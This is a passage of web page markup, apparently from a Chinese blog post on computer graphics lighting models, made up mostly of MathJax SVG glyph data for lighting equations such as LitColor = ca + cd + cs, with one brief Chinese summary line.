685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path><path id="MJX-1-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-1-TEX-N-38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g></g></g><g data-mml-node="mo" transform="translate(1125.4,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(2181.2,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(3059.2,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(3588.2,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(4160.2,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(4549.2,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(5452.4,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5952.6,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(6552.6,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(6997.3,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(7497.3,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(8108.5,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(8608.7,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(10154.5,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(11154.7,0)"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(12526.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(12915.4,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(14045.6,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mfrac" transform="translate(14434.6,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(1100.2,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(2100.4,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(1270.2,-686)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="2800.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(17475.1,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(17864.1,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(18686.3,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(19186.5,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(19762.5,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mstyle" transform="translate(20855.4,0)"><g data-mml-node="mspace"></g></g></g></g></svg></mjx-container>

<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>总结了光照模型的概述</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -43.845ex" xmlns="http://www.w3.org/2000/svg" width="72.885ex" height="88.821ex" role="img" focusable="false" viewBox="0 -19879.5 32215.1 39258.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path><path id="MJX-1-TEX-I-1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path><path id="MJX-1-TEX-I-1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path><path id="MJX-1-TEX-I-1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path><path id="MJX-1-TEX-I-1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path><path id="MJX-1-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-I-1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path><path id="MJX-1-TEX-I-1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path><path id="MJX-1-TEX-I-1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path><path id="MJX-1-TEX-I-210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path><path id="MJX-1-TEX-N-38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path><path id="MJX-1-TEX-N-3A" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path><path id="MJX-1-TEX-I-1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtable"><g data-mml-node="mtr" transform="translate(0,19129.5)"><g data-mml-node="mtd" transform="translate(10974.6,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(681,0)"><use data-c="1D456" xlink:href="#MJX-1-TEX-I-1D456"></use></g><g data-mml-node="mi" transform="translate(1026,0)"><use data-c="1D461" xlink:href="#MJX-1-TEX-I-1D461"></use></g><g data-mml-node="mi" transform="translate(1387,0)"><use data-c="1D436" xlink:href="#MJX-1-TEX-I-1D436"></use></g><g data-mml-node="mi" transform="translate(2147,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(2632,0)"><use data-c="1D459" xlink:href="#MJX-1-TEX-I-1D459"></use></g><g data-mml-node="mi" transform="translate(2930,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(3415,0)"><use data-c="1D45F" xlink:href="#MJX-1-TEX-I-1D45F"></use></g><g data-mml-node="mo" transform="translate(4143.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(5199.6,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g></g></g><g data-mml-node="mo" transform="translate(6311.8,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(7312.1,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(8418,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(9418.2,0)"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g></g></g></g></g><g data-mml-node="mtr" transform="translate(0,17729.5)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,16210.6)"><g data-mml-node="mtd"><g data-mml-node="mstyle"><rect fill="yellow" x="0" y="-360.6" width="32215.1" height="1229.5" data-bgcolor="true"></rect><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(681,0)"><use data-c="1D456" xlink:href="#MJX-1-TEX-I-1D456"></use></g><g data-mml-node="mi" transform="translate(1026,0)"><use data-c="1D461" xlink:href="#MJX-1-TEX-I-1D461"></use></g><g data-mml-node="mi" transform="translate(1387,0)"><use data-c="1D436" xlink:href="#MJX-1-TEX-I-1D436"></use></g><g data-mml-node="mi" transform="translate(2147,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(2632,0)"><use data-c="1D459" xlink:href="#MJX-1-TEX-I-1D459"></use></g><g data-mml-node="mi" transform="translate(2930,0)"><use data-c="1D45C" xlink:href="#MJX-1-TEX-I-1D45C"></use></g><g data-mml-node="mi" transform="translate(3415,0)"><use data-c="1D45F" xlink:href="#MJX-1-TEX-I-1D45F"></use></g><g data-mml-node="mo" transform="translate(4143.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(5199.6,0)"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(6736.3,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(7736.5,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g 